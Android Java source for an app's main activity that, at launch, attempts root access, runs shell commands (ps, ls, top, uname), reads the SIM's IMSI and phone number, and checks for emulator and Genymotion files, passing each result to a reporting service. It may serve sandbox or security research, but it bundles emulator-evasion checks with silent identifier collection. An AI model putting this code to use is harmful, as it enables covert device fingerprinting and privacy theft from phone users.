package com.rosetta.dynamit;

import android.Manifest;
import android.content.Intent;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;

import java.io.File;
import java.lang.reflect.Array;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    public static final String DATA_KEY = "data";
    public static final ArrayList<String> EMULATOR_PATHS = new ArrayList<String>() {{
        add("/dev/socket/qemud");
        add("/dev/qemu_pipe");
        add("/system/lib/libc_malloc_debug_qemu.so");
        add("/sys/qemu_trace");
        add("/system/bin/qemu-props");
        add("/dev/socket/genyd");
        add("/dev/socket/baseband_genyd");
    }};

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("Philae", "up and running");

        ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_PHONE_STATE}, 1);
        startProbing();

    }


    public void startProbing(){
        Intent reportServiceIntent = new Intent(this, ReportService.class);

//        reportServiceIntent.putExtra(DATA_KEY, "DANGO -> 01");
//        startService(reportServiceIntent);

//        String shellSudoRes = Shell.sudo("screenrecord --time-limit 10 /sdcard/MyVideo.mp4");
//        reportServiceIntent.putExtra(DATA_KEY, shellSudoRes);
//        startService(reportServiceIntent);

        String shellEmptyShell = Shell.sudo("");
        reportServiceIntent.putExtra(DATA_KEY, shellEmptyShell);
        startService(reportServiceIntent);

        String shellPSRes = Shell.userCmd("ps");
        reportServiceIntent.putExtra(DATA_KEY, shellPSRes);
        startService(reportServiceIntent);

        String shellLSRes = Shell.userCmd("ls");
        reportServiceIntent.putExtra(DATA_KEY, shellLSRes);
        startService(reportServiceIntent);

        String shellTOPRes = Shell.userCmd("top -n 1");
        reportServiceIntent.putExtra(DATA_KEY, shellTOPRes);
        startService(reportServiceIntent);

        String shellKernelVersion = Shell.userCmd("uname -a");
        reportServiceIntent.putExtra(DATA_KEY, shellKernelVersion);
        startService(reportServiceIntent);

        reportServiceIntent.putExtra(DATA_KEY, "Imsi: " + getImsi());
        startService(reportServiceIntent);

        reportServiceIntent.putExtra(DATA_KEY, "Phone number: " + getPhoneNumber());
        startService(reportServiceIntent);

    /*    reportServiceIntent.putExtra(DATA_KEY, "IMEI: " + getIMEI());
        startService(reportServiceIntent);*/

        reportServiceIntent.putExtra(DATA_KEY, "Emulator files found: " + getEmulatorFiles(EMULATOR_PATHS));
        startService(reportServiceIntent);
            }

    public String getImsi(){
        TelephonyManager telephonyManager = (TelephonyManager) this.getSystemService(this.TELEPHONY_SERVICE);
        String imsi = telephonyManager.getSubscriberId();
        Log.d("apis-imsi", imsi);
        return imsi;
    }

    public String getPhoneNumber() {
        TelephonyManager telephonyManager = (TelephonyManager) this.getSystemService(this.TELEPHONY_SERVICE);
        String phoneNumber = telephonyManager.getLine1Number();

        Log.d("apis-phone-number", phoneNumber);
        return phoneNumber;
    }

    public String getIMEI() {
        TelephonyManager telephonyManager = (TelephonyManager) this.getSystemService(this.TELEPHONY_SERVICE);
        String IMEI = telephonyManager.getDeviceId();

        Log.d("apis-IMEI", IMEI);
        return IMEI;
    }

    public String getEmulatorFiles(ArrayList<String> paths) {
        ArrayList<String> foundPaths = new ArrayList<>();

        for (String path:paths) {
            if (new File(path).exists()) {
                foundPaths.add(path);
            }
        }

        Log.d("apis-emulator_files", foundPaths.toString());
        return foundPaths.toString();
    }
}
